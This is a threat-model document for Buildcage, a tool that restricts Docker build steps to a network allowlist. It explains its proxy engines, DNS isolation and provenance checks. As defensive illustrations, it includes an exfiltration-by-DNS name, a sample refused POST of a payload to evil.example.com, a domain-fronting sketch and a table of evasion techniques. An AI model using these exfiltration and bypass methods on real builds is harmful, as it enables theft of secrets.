# Security Details

This document is the threat model behind Buildcage: what it governs, how a build is kept to its
allowlist, and where it stops short. For how to configure the action, see the
[README](../README.md); for implementation internals (the supervisor binary, RPC plumbing, log
parsing), see the [Development Guide](./development.md). For a high-level overview, see
[buildcage.github.io](https://buildcage.github.io/).

## Contents

- [Threat model](#threat-model)
- [How the cage works](#how-the-cage-works)
- [Engines](#engines)
- [Attempts to get around it](#attempts-to-get-around-it)
- [What the engines cannot see](#what-the-engines-cannot-see)
- [Credentials in a URL](#credentials-in-a-url)
- [What the builder container runs with](#what-the-builder-container-runs-with)
- [Hardening](#hardening)
- [Image Provenance Verification](#image-provenance-verification)

## Threat model

Buildcage governs the code that runs inside a `RUN` step: a dependency's `postinstall`, a build
script, a compiler plugin, none of which the Dockerfile author reviewed. It decides which
destinations that code can reach, and records what it tried.

Three things sit outside that model by design.

- **Whoever writes the Dockerfile and the workflow.** The allowlist is configured alongside them, by
  the same people, so Buildcage is not a control against them.
- **What buildkitd fetches for itself**, [below](#what-buildkitd-fetches-itself).
- **Another step in the same job.** Running between `setup` and `report`, an untrusted step can
  reach the proxy container through `docker exec` or `docker cp`, or the host filesystem directly on
  a passwordless-sudo runner, and rewrite the traffic log. `report` refuses a log that doesn't start
  where a real proxy run would, which catches wholesale erasure, but not a format-aware forgery.
  The defense here is procedural: don't place an untrusted step between `setup` and `report`.

There is also a structural limit no rule set fixes. An allowlist decides destinations, so it cannot
tell a legitimate use of an allowed destination from an abusive one, and anything leaving through a
service you had to allow anyway still leaves. What it does stop is traffic to a destination that is
not on the list, and infrastructure an attacker set up is normally not on it, because the build has
no reason to reach it. That is also the hardest kind of leak to find afterwards, which is why
closing it is worth doing even though the rest stays open. [Hardening](#hardening) is about making
the set of destinations a build needs smaller.

### What buildkitd fetches itself

Every engine intercepts `RUN` step traffic and nothing else. buildkitd is not on the isolated
network, so what the daemon fetches never reaches the proxy, never appears in the report, and never
trips `fail_on_blocked`:

- **`FROM`** (`docker-image://`), including every stage's base image and any image named in
  `COPY --from=`.
- **`ADD <url>`**, the HTTP source. The URL is `ARG`-expanded, so a build argument can end up in it.
- **git contexts and git sources**, whether the context itself or a `FROM`/`ADD` naming a repository.
- **the frontend image a `# syntax=` directive names**, and whatever that frontend then asks
  buildkitd to fetch through the gateway API. This is the broadest of the four: a frontend produces
  the LLB the daemon runs, so it can read a step's output back and fetch on the daemon's behalf.

This is a scope decision rather than a gap left open. All four are destinations a developer writes
into the Dockerfile, so they are reviewable source, and they are resolved before any step runs. What
covers them is ordinary supply chain practice: reviewing the Dockerfile, and pinning base images and
the `# syntax=` frontend by digest rather than by a floating tag.

`ADD <url>`, image and git sources stay unaffected on every engine.

## How the cage works

`universal` and `inspect` share the arrangement below, and differ only in how much of a connection
they can read.

### Every RUN step runs on its own network

Each container BuildKit spawns for a `RUN` step is placed on an isolated CNI network (the
`buildcage0` bridge, 198.19.255.0/24). An iptables `PREROUTING REDIRECT` rule sends all TCP from that
bridge to the proxy whatever its destination, so DNS-resolved and direct-IP connections both arrive
there, and a `FORWARD` rule drops everything else, so no other protocol has a way out and
buildkitd's own API is unreachable from a step. An `INPUT` rule likewise restricts the proxy's
listening port to that same bridge.

Nothing in the build has to be told about a proxy: interception is at the network level, so the
`HTTP_PROXY` family of variables is not what puts a request in front of the rules, and ignoring them
changes nothing.

### The proxy chooses the destination, not the build

A rule matches on the name the request carried, the SNI or the `Host` header. Once it has passed,
the proxy resolves that name itself and rewrites the destination to the result (`do-resolve` and
`set-dst`), so the address the build chose is discarded. A forged `Host`, a doctored `/etc/hosts`,
or an SNI naming one host while the connection aims at another all reach the server the name belongs
to: destination spoofing is removed rather than detected.

That order is an invariant, not an optimisation. Reversed, resolution would become the exfiltration
channel the resolver below exists to prevent, so a name a request would be refused for never
triggers a real DNS query.

Where the proxy resolves is the container's own `/etc/resolv.conf`. On a runner that is Docker's
embedded DNS forwarding to the runner's own resolvers, so a name only an internal resolver knows
still resolves, and the query follows the runner's own DNS policy. There is no search-domain
expansion, so a rule has to name a host in full.

### DNS never leaves the job

The resolver inside the cage has no upstream at all, and answers every query, on the allowlist or
not, with the proxy's own address. A lookup by itself therefore cannot carry anything out:
`SECRET-DATA.attacker.example` would otherwise reach an attacker's own nameserver the moment it was
forwarded. Answering a name outside the allowlist the same way as one inside is deliberate too, so
that the request which follows is recorded with its URL before it is refused.

No discovery record is returned either. Having no upstream, the resolver has nothing to answer an
`SRV`, `TXT`, `TLSA` or `URI` query with, which is load-bearing rather than incidental:
`_http._tcp.deb.debian.org` really does carry an `SRV` record pointing at `debian.map.fastlydns.net`,
and a build that followed it would connect to a name no allowlist mentions. A client that cannot
fall back, such as a `mongodb+srv://` connection string, does not work inside the cage; see
[Service discovery](../README.md#service-discovery).

### A name may not resolve inward

An allowlisted name that resolves to loopback, link-local (AWS/GCP/Azure IMDS), CGNAT (Alibaba
IMDS), the IETF protocol block (Oracle IMDS), Azure's WireServer (`168.63.129.16`), the proxy's own
address, or **an address the runner itself holds** is refused, reported as `internal-address`, in `audit` too. A name under an
attacker's control, or DNS for an allowlisted domain that has been compromised, therefore cannot
turn the proxy into a route to cloud metadata or back into the runner. The rest of RFC1918 is
deliberately exempt: a name pointing at an internal mirror is a real, intended setup.

The runner's addresses come from two places, because neither sees all of them: the action reads the
runner's interfaces before starting the builder, and the engine adds the gateway of the network
Docker then put it on, which did not exist when the action looked. The engine also adds the
builder's own address on that network, which Docker's DNS returns for the builder's service and
container names, so a request naming them cannot loop the proxy into itself. A published container port is
DNAT'd, so it answers on every one of them.

Two consequences worth knowing:

- **An internal mirror running on the runner itself is no longer reachable by name.** Name it with
  `allowed_ip_rules` instead, which never goes through this guard. The same applies to a public name
  that resolves to the runner's own public address, which a self-hosted runner may well have.
- The list is read once at startup, and on a containerised runner it holds that container's
  addresses rather than the real host's.

This guard is about a _name_ landing somewhere it never should. A rule whose host is a literal
address, such as `169.254.169.254:80`, is exempt for the requests that rule itself allows. A
wildcard or regex that merely admits the address, `**:80` or `~^.*:80$`, is not. Reaching a cloud
metadata endpoint directly, the way any AWS or GCP SDK does, is not what this is meant to stop, and
`allowed_ip_rules` is the intended path for it.

### Only TCP gets out

Everything that is not TCP is dropped before it reaches the proxy, so ICMP, raw UDP and QUIC have no
exit path at all; port 53 to the gateway, which is the resolver, is the one exception. IPv6 is
dropped the same way, AAAA lookups are answered with no records, and the proxy
reaches allowed names over IPv4 only. The cost of that last part is an allowed name with AAAA
records and no A record: it never resolves here, is refused on every attempt, in `audit` too, and is
reported as `dns-failed` with no rule able to clear it.

## Engines

The engines differ in how much of a connection a rule gets to see. `universal` reads the name at the
front of it; `inspect` terminates TLS and reads the request. For choosing between them, see
[Engines](../README.md#engines).

### Universal proxy engine

<img src="../assets/diagram-architecture-universal.png" alt="Universal proxy engine architecture" width="611" height="490">

The engine to fall back to when something in the build cannot accept the `inspect` engine's CA. It
decrypts nothing: HAProxy classifies each connection by what it can read at the front of it, then
checks that against the allowlist.

- **HTTPS**: the SNI from the TLS ClientHello, read without terminating the connection, so the build
  validates the origin's own certificate itself. Checked against `allowed_https_rules`.
- **HTTP**: the `Host` header, checked against `allowed_http_rules`. A request carrying none is
  refused with 400, since there is nothing to check it against.
- **A connection to a bare address**: nothing at all. It skipped DNS, so there is no name to read.
  It is matched against `allowed_ip_rules` as `ip:port` and, when nothing matches, refused. The
  address is the one the connection goes to; an SNI it carries is ignored, since the client chose it.

Because nothing in the build has to trust an injected CA or be told about a proxy, this engine
covers any language or package manager, a pinned certificate included, with no Dockerfile change.

A connection to a bare address never reaches the [inward-resolution guard](#a-name-may-not-resolve-inward):
it skips DNS and `do-resolve` entirely, on a separate code path, and `allowed_ip_rules` is what
decides it.

### Inspect proxy engine

<img src="../assets/diagram-architecture-inspect.png" alt="Inspect proxy engine architecture" width="611" height="796">

The default engine. Same network layout as `universal`, but the proxy terminates TLS instead of only
reading the SNI, so a rule can check the method and the full URL rather than only the destination.
One listener takes both TLS and plaintext, told apart by the first bytes of the connection, so an
audit run records everything without being configured for it first.

| Rule                  | What it permits                            | Decided by           | Decrypted |
| --------------------- | ------------------------------------------ | -------------------- | --------- |
| `allowed_https_rules` | any method and path on the host, over TLS  | Host header          | yes       |
| `allowed_http_rules`  | any method and path on the host, plaintext | Host header          | n/a       |
| `allowed_url_rules`   | the named methods on matching URLs         | Host header and path | yes       |
| `allowed_tls_rules`   | TLS to the named host and port             | SNI and port         | **no**    |
| `allowed_ip_rules`    | TCP to the address and port, any protocol  | address and port     | **no**    |

Three mechanisms make that enforceable:

- **The certificate the build sees is generated from the SNI alone**, so a refused destination is
  never contacted. The only path that reaches an origin is the backend, after a request has already
  passed the rules, and the origin's own certificate is checked on that connection.
- **The path is normalized before the rules see it**: `%2e` is decoded and `..` segments are
  removed. A `..` joined to an encoded separator (`..%2f`, `..%5c`) or to `;`, and any backslash, is
  refused. Encodings HAProxy does not decode, such as a double-encoded `%252e`, `%00` or an
  overlong UTF-8 dot, reach the origin as written and matter only to an origin that decodes them
  again.
- **`buildcage-runc`**, a wrapper around BuildKit's own `buildkit-runc`, makes each step trust the
  proxy's CA by bind-mounting a scratch copy of the CA store over the step's own view of it, writing
  back to the real one only if the step actually changed it. It also leaves the certificate in the
  distribution's anchor directory, so a step that installs `ca-certificates` part-way through keeps
  trusting it once the bundle is rebuilt, and adds it, the same mirrored way, to the keystore a JVM
  already in the base image reads (`$JAVA_HOME/lib/security/cacerts`, in either the JKS or PKCS#12
  shape it ships), which no CA-trust variable would reach. Chromium reads neither, only the NSS
  database in `$HOME`, so the wrapper binds over `~/.pki/nssdb` a copy of a database holding only
  the CA, made by `certutil` in the proxy container from the CA certificate alone. The step's own
  database is never parsed, and a step that changes the copy fails the build. Injection happens at exec time, never touches LLB, and so
  cannot affect a cache key. Before the step's layer is committed, the wrapper reads that layer back
  and takes the certificate, and the anchor, out of every text file carrying it as PEM, every JKS
  or PKCS#12 trust store carrying it (a PKCS#12 one opened with no password or `changeit`), each
  bare DER a trust store splits the bundle into (Mono's
  `cert-sync` writes one per certificate), and the EFI signature database RHEL's `update-ca-trust`
  writes. A copy it finds but cannot remove fails the build, or only warns under
  `fail_on_ca_residue: false`, which leaves it in the image: one
  inside any other binary, the PEM re-wrapped (escaped into JSON, indented in YAML, on one line or
  in lines of 48 characters or more), a certificate the proxy issued (saved from a server trust-on-first-use), or a PKCS#12 trust store
  holding such a certificate that opens with no password or `changeit`. A copy it cannot read stays
  in the image: one in a compressed archive, hex-dumped, re-wrapped outside a PEM block in shorter
  lines, in a keystore encrypted under another password, or in a
  PKCS#12 naming more than a million key-derivation iterations. Those are not failed on, since
  dependencies ship encrypted test keystores and failing on them would break builds that never
  touched the CA. Reading the layer back needs BuildKit's `overlayfs` snapshotter, which the builder
  started by this action gets. On a builder whose data root cannot hold an overlay upper directory,
  BuildKit falls back to another snapshotter, the wrapper warns in each step's output that it is
  leaving the layer unread, and only the store directory's own undo applies.

A wide host rule paired with a narrow path or method does not narrow the DNS side. DNS has no notion
of a path, so a name under an allowed `*.example.com` is logged as allowed the moment it is looked
up, before any path is known. The request that follows is still refused and still never reaches an
origin; only the log line reflects the host-only nature of that decision. See
[Rule syntax](./reference.md#rule-syntax) for how to write a host pattern that doesn't widen this
more than intended.

## Attempts to get around it

| What the build does                                                                                | What happens                                                                                                                                                 |
| -------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Asks for any name, on or off the allowlist                                                         | Answered locally with the proxy's own address; the query is never forwarded, allowed or not                                                                  |
| Requests a host no rule covers                                                                     | Refused, origin never contacted; `inspect` records the URL it asked for                                                                                      |
| Requests a path or method no rule covers                                                           | **403** under `inspect`, recorded with its URL; `universal` reads neither and enforces on the host                                                           |
| Walks out of an allowed path with `..` or `%2e%2e`                                                 | **403**: the path is normalised before the rules see it, and a `..` joined to an encoded separator or `;` is refused, as is any backslash                    |
| Sends an allowed name while aiming elsewhere, or points `/etc/hosts` at an address of its choosing | Reaches the address the proxy resolved; the build's own choice of address is discarded                                                                       |
| Puts an address in the `Host` header                                                               | Taken as the destination once a rule allows it; an internal one only if a rule names it as its host                                                          |
| Allowlists a name that resolves to an internal address                                             | Refused if it lands on loopback, link-local, the proxy itself, an address the runner holds, or another never-public range, in `audit` too                    |
| Reaches an allowed host presenting a wrong certificate                                             | **503** under `inspect`, which checks the origin's certificate when it connects and fails the step; under `universal` the build validates it itself          |
| Presents a wrong certificate and then stops answering, to look like an outage                      | Still fails the step: a connection `inspect` never completed is one whose origin it never authenticated, so it is refused whether or not the error survived  |
| Uses ECH to conceal the real SNI                                                                   | Reaches whatever the outer SNI resolved to, and that outer name still has to be allowed; the type 65 record carrying ECHConfig is never returned either      |
| Encodes data into DNS queries                                                                      | Answered locally and never forwarded; an outside resolver is unreachable                                                                                     |
| Uses DNS over TLS or DNS over HTTPS                                                                | Redirected to the proxy like any other TCP and checked on its SNI, so an outside resolver is reachable only if its own host and port are allowlisted         |
| Tunnels over ICMP, raw UDP or QUIC, or falls back to IPv6                                          | Dropped before the proxy; only TCP is redirected to it, and the proxy reaches allowed names over IPv4                                                        |
| Connects to a raw address                                                                          | Checked against `allowed_ip_rules`, and refused when nothing matches                                                                                         |
| Speaks something that is not HTTP to a port no rule covers                                         | Read as a request by the stage it is handed to and refused, on both engines, and the refusal is counted like any other                                       |
| Ignores the proxy variables entirely                                                               | No effect: interception is at the network level, not opt-in                                                                                                  |
| Sends `*` as its method, `Host` or path in audit, to plant a wildcard in the suggested rules       | Left out of the suggested `allowed_url_rules` and listed beside it, so pasting them never permits more than the build sent                                   |
| Floods the proxy log until earlier entries rotate away                                             | A log that no longer starts where a real run does is not accepted as a complete record: the step fails under `restrict` with `fail_on_blocked` (the default) |

## What the engines cannot see

### Domain fronting

`universal` reads the SNI but cannot decrypt what follows, and the `Host` header that would reveal
the real target is inside the tunnel:

```
1. ClientHello SNI: allowed.example.com     ← all Buildcage sees → allowed
2. HTTP Host header: malicious.example.com  ← encrypted, not inspectable
3. The CDN routes on the Host header        → reaches the attacker's server
```

For this to work, the allowed domain and the target domain have to sit on the same CDN or hosting
infrastructure. Closing the gap needs the proxy to terminate TLS and read that header, which is what
[`inspect`](#inspect-proxy-engine) does: `allowed_url_rules` matches on the real `Host`, so a
fronted request lands outside any host rule it was written for.

Staying on `universal`, allow as few domains as you can, and prefer a service's own domain
(`registry.npmjs.org`) to a broad CDN wildcard. Check what your CDN provider does about fronting
today, and re-run [audit mode](../README.md#operation-modes) periodically to notice a connection
pattern that has changed.

### Passthrough rules are an uninspected pipe

Under `universal` and `inspect`, `allowed_tls_rules` and `allowed_ip_rules` are passed through as
raw TCP and recorded with a byte count and nothing more. Once an `ip:port` pair is allowlisted, any
TCP-based protocol can use that path, and its protocol is never checked. Prefer domain rules, and
keep `allowed_ip_rules` for destinations that genuinely have no stable hostname.

`universal` sees nothing inside any tunnel, not only these: a rule reaches as far as a host and a
port, so the method and the path are neither enforced nor reported.

### `inspect` cannot work with everything, in either mode

TLS is terminated, so a tool that pins a certificate, or ships a bundled trust store it never lets
the system update, will not work. The JVM (Java, Kotlin, Scala) reads only its own keystore rather
than the CA-trust variables; a JVM already in the base image is handled by injecting into that
keystore, but one sealed with a password other than the JDK default falls back to `universal`.
Chromium's NSS database is covered with one trusting the CA; a step that writes to it fails.
See [Limitations](../README.md#limitations) for the rest of the
compatibility picture.

`audit` is not a passive observer here either. TLS is terminated in both modes, so a tool that
cannot accept the CA fails under `audit` exactly as it would under `restrict`. What `audit` drops is
the rule ACLs, not the interception: `set-dst`, the origin certificate check and the
[inward-resolution guard](#a-name-may-not-resolve-inward) all stay, because none of them can be
dropped honestly.

### No SLSA provenance

Neither `universal` nor `inspect` produces SLSA provenance: attaching one would mean modifying
BuildKit itself. The traffic artifact (see [Report action](../README.md#report-action)) carries URL,
method, status and size as an observation record, but no content digest.

## Credentials in a URL

**Communication details** and the job log print the URL of every request, so a credential written
into a query string reaches everyone who can read the run. GitHub masks the values it knows as
workflow secrets, which leaves the ones it does not: a presigned URL's signature, a token minted
during the build, or a secret whose URL-encoded form no longer matches what was registered.

The value of a query parameter named `access_token`, `api_key`, `apikey`, `auth`, `client_secret`,
`code`, `id_token`, `key`, `password`, `private_token`, `refresh_token`, `secret`, `sig`,
`signature`, `token`, `x-amz-security-token`, `x-amz-signature` or `x-goog-signature` is therefore
replaced, whatever its case:

```
✅ 00:04.212: GET https://cdn.example.com/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600 -> 200 (4.1MB)
🚫 00:05.003: POST https://evil.example.com/?d=BASE64PAYLOAD -> not-allowed
```

Everything else is printed as it was sent, parameter names included, so most of what a refused
request tried to send is still there. Two things this does not cover: a credential in the path,
which `allowed_url_rules` is written against and so cannot be hidden; and one in a parameter the list
does not name. It also replaces an exfiltration payload the sender happened to name `code` or
`key`, so **read a suspected attempt out of the
[traffic artifact](./reference.md#traffic-artifact)**, which keeps every value verbatim, rather than
out of the summary.

An `allowed_url_rules` block suggested by an audit run never carries a query at all: rules match on
the path, and a recorded query is as likely to hold a one-off token as anything reusable.

## What the builder container runs with

A builder has to mount, create namespaces and manage cgroups, which is why the one
`docker/setup-buildx-action` starts runs `--privileged`. Buildcage's does not. Against that
container it is narrower on every axis but one; against a container started with no options at all
it widens two.

- **`SYS_ADMIN`, `NET_ADMIN` and `SYS_PTRACE`, on top of Docker's default set.** The BuildKit OCI
  worker mounts, creates namespaces and manages a cgroup for each `RUN` step. `NET_ADMIN` covers
  iptables and the CNI bridge under `universal` and `inspect`. runc reads `/proc/PID/ns/mnt` to set a
  step's mount namespace up.
- **Seccomp is Docker's own default profile**, where `privileged` switches filtering off entirely.
  The only additions are the two things that profile refuses at every capability and runc still
  needs: `pivot_root`, and the three `keyctl` operations runc performs per step. Everything outside
  the allowlist stays refused, including syscalls added to the kernel after the profile was written.
- **AppArmor is unconfined, as it also is under `privileged`.** `docker-default` refuses every
  `mount` regardless of capabilities, so it cannot coexist with the `SYS_ADMIN` above, and a
  replacement profile would have to be loaded into the host kernel, which an action cannot do
  portably.
- **The cgroup tree it can write is its own.** The container asks for a private cgroup namespace and
  remounts that namespace's `/sys/fs/cgroup` read-write at startup, so the host's cgroup tree is
  neither visible nor writable, where `privileged` would expose the host's `/proc` and `/sys` as
  well. This is what makes a cgroup v2 host a requirement, which startup checks for by name. Every
  GitHub-hosted runner is v2.
- **No Docker socket, no workspace mount, and devices refused by the device cgroup.** The first two
  are simply never given; the third is what `privileged` would undo, since it allows every device
  outright. Lifting the device filter takes `CAP_SYS_ADMIN` in the builder itself, which is a
  question only for a `RUN` step that has already broken out of runc.

## Hardening

Buildcage runs against your Dockerfile as it is, and an allowlist generated from an audit run
already blocks every destination the audit did not record. Going further is about shrinking the set
of services that stay reachable, which is the [structural limit](#threat-model) above. Weigh what
follows against what the build has access to.

### Keep each rule as narrow as it can be

An audit run only ever emits the exact `host:port` pairs it observed. Wildcards and `:*` ports come
from broadening a rule by hand, and each one covers destinations the build never asked for. Where a
broad rule exists, it is worth checking whether the build can be changed instead.

Pay particular attention to general-purpose destinations: a gist host, object storage, or an API
that can create repositories. They accept uploads as readily as they serve downloads, which is what
makes them useful for sending data out.

A wildcard host widens the DNS side too. The resolver inside the cage answers locally and forwards
nothing (see [DNS never leaves the job](#dns-never-leaves-the-job)), but a request the rules admit is
resolved upstream by the proxy against the runner's own DNS before it connects. Under `*.example.com`
a name like `<data>.example.com` is resolved the moment the request is allowed, so its labels reach
that domain's authoritative nameserver even if the request is then refused on its path. In `audit`,
where nothing is refused, every name the build asks for is resolved this way. A literal host, or a
narrow wildcard, limits which names leave the job.

### Reduce what has to be reachable

A package registry is usually the one entry a build cannot do without, and the fetch has to happen
inside the build. What can change is which registry. A mirror configured as a read-only
pull-through cache serves upstream packages on demand and accepts no publishes, so nothing can be
uploaded to the destination on your allowlist. Running one is a bigger commitment than anything
else in this section.

### Keep the rest of your supply chain practice

Pinning versions, lockfiles, review, least-privilege tokens, and a dependency cooldown each cover
something an allowlist does not. Pinning by digest belongs here too, for base images and for a
`# syntax=` frontend alike, since buildkitd resolves both itself, off the isolated network (see
[What buildkitd fetches itself](#what-buildkitd-fetches-itself)). Buildcage is one layer among them,
not a replacement for any.

## Image Provenance Verification

Buildcage decides what the build can reach, so it is fair to ask what says the Buildcage image is
the one this repository published.

Each release's image is bound to the CI workflow that built it by [Sigstore](https://sigstore.dev)
keyless signing, and the setup action verifies that binding at startup. The signature covers the
exact source commit SHA, so a tampered or substituted image fails verification before it is used.

### How it works

**At release time**, the `docker-publish.yml` workflow builds and signs the image using a short-lived
OIDC identity issued by GitHub Actions. The signature is stored as a **Sigstore Bundle v0.3**
attached to the image through the OCI 1.1 Referrers API in GHCR. The bundle holds the signature, a
Fulcio leaf certificate carrying the workflow identity, and a Rekor transparency log entry. Signing
waits on a build that runs through the image just pushed, so an image that does not enforce is never
signed, and an unsigned image is one the setup action refuses.

**At action startup** (the `main` phase, so `docker/login-action` has already stored registry
credentials), the setup action verifies the image entirely in-process using `@sigstore/verify`,
`@sigstore/tuf` and `@sigstore/bundle`. No external binary such as cosign is downloaded or required.
It resolves the tag to a manifest digest and fetches the bundle for that digest from the Referrers
API. A single `verifyBundle()` call then enforces every identity check at once: the OIDC issuer, the
signing workflow and its ref or version, and the source commit SHA carried in Fulcio OID
`1.3.6.1.4.1.57264.1.13`. That is the equivalent of cosign's `--certificate-oidc-issuer`,
`--certificate-identity-regexp` and `--certificate-github-workflow-sha`.

Two assertions then run against the verified bundle, both fail-closed:

- **The signed digest must equal the digest the tag resolved to.** This closes the attribution gap
  the Referrers API leaves open.
- **The image's `org.opencontainers.image.version` must name the engine this run asked for.** The
  signature covers a digest, not a tag, so without this a `-inspect` tag repointed at the same
  release's `universal` image would run without URL and TLS enforcement.

### Identity matching by reference type

| How the action is pinned       | Identity check                                              | Mechanism                                                              |
| ------------------------------ | ----------------------------------------------------------- | ---------------------------------------------------------------------- |
| `@<40-char SHA>`               | Source Repository Digest **strictly equals** the pinned SHA | `certificateOIDs`: Fulcio OID `1.3.6.1.4.1.57264.1.13`, raw byte match |
| `@v4.0.0` (exact version)      | SAN matches `...@refs/tags/v4\.0\.0(\.\|$)`                 | `certificateIdentityURI` regexp                                        |
| `@v4` (major-floating)         | SAN matches `...@refs/tags/v4(\.\|$)`                       | `certificateIdentityURI` regexp                                        |
| A branch name, or a local path | **Hard fail**: pin to a version tag or commit SHA           |                                                                        |

For the strongest guarantee, pin to a **commit SHA**:

```yaml
uses: buildcage/docker@<40-char-sha> # vX.Y.Z
```

The SHA check is the core of tamper detection: it confirms the image was built from exactly the same
source tree as the pinned action commit. An image built from a different commit fails verification
even if it is signed. An attacker who can push to `ghcr.io/buildcage/docker` without compromising
the repository cannot produce a valid bundle, since the Fulcio certificate requires an OIDC token
issued during a real workflow run on the real repository.

### Verification Limitations

Verification establishes where the image came from. Here is what it leaves uncovered.

- **The build before signing is a smoke test, not the test suite.** It proves the released image
  starts and enforces on a single allowed and a single refused host, per engine and per
  architecture. The scenario coverage in `test/` runs against an image built from the branch, and
  the parts of it that need the fixture origin cannot run against a released image at all.
- **A signature says who built the image, not what the code does.** A release published by someone
  who has taken over that identity verifies just as cleanly as a legitimate one. Two things limit
  the damage: with a commit-SHA pin, a new release cannot reach your workflow until you change the
  pin yourself, and every signature is recorded in the Rekor transparency log, so an unintended
  release is discoverable after the fact.
- **A floating tag is a pointer someone else moves.** Under `@v4` or `@v4.0` the signing identity
  accepts any release in that series, so the tag can also be moved back to an older one. Both the
  registry tag and the git tag are writable by whoever publishes releases, which is the reason to
  prefer a commit SHA: it puts you in charge of when you move.
- **The registry decides which signed image gets verified.** Everything after the tag lookup is
  bound to the digest it returned, so content substituted later makes verification **fail** rather
  than falsely pass, leaving no time-of-check/time-of-use gap. What remains is the tag lookup
  itself: an attacker with write access to the registry could repoint the tag, but only at an image
  this repository's release workflow genuinely signed.
- **Sigstore has to be reachable.** Verification depends on the Rekor transparency log and the
  Fulcio CA, and fetches the TUF trust root at verification time. An outage there fails the action
  rather than skipping the check. Each fetch starts from the root embedded in the action, never
  from one an earlier job left on a persistent runner.
- **A build-time test hook exists, but not in what you run.**
  `BUILDCAGE_BUILD_TEST_HOOKS=1 vp run build` produces a `dist/` where a `BUILDCAGE_LOCAL_IMAGE_REF`
  override can point the action at an unpublished image, used only by this repo's own CI and local
  development. Tree-shaking drops that module out of every normal build, and a CI check inspects the
  published `dist/` to confirm it never reads the flag, so no `env:` a consumer sets can reach it.
  See [development.md](./development.md#local-development).

Tampering with the container after startup is a separate question, and is covered under
[Threat model](#threat-model) above.
